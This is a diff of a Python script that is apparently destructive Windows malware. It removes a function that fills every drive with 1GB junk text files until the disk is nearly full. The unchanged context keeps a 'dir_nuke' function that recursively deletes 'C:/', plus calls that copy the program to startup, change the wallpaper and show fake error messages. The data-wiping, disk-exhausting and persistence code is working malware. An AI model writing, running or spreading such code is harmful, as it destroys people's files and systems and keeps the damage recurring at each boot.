@@ -50,37 +50,6 @@ def generate_random_text(size):
     letters = string.ascii_letters
     return ''.join(random.choice(letters) for _ in range(size))
 
-def create_system_files():
-    # Get a list of available drives
-    drives = psutil.disk_partitions()
-
-    for drive in drives:
-        drive_name = drive.device
-        drive_free_space = psutil.disk_usage(drive_name).free
-
-        # Check if drive has at least 1GB of free space
-        if drive_free_space >= 1e9:
-            folder_path = os.path.join(drive_name, "SystemFiles")
-
-            # Create the folder if it doesn't exist
-            if not os.path.exists(folder_path):
-                os.mkdir(folder_path)
-
-            # Fill the folder with 1GB text files until less than 1GB of free space is left
-            while drive_free_space >= 1e9:
-                file_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
-                file_path = os.path.join(folder_path, file_name + ".txt")
-                text = generate_random_text(int(1e9))  # Generate 1GB of random text
-
-                # Write the text to the file
-                with open(file_path, "w") as file:
-                    file.write(text)
-
-                # Update the free space on the drive
-                drive_free_space = psutil.disk_usage(drive_name).free
-
-            print(f"Filled {drive_name} with 1GB text files.")
-
 def dir_nuke():
     dir = 'C:/'
     shutil.rmtree(dir)
@@ -103,8 +72,6 @@ if __name__ == "__main__":
     copy_to_startup()
     change_wallpaper()
     time.sleep(2)
-    copy_to_startup()
-    create_system_files()
     display_image_box()
     display_error_messages()
     time.sleep(45)
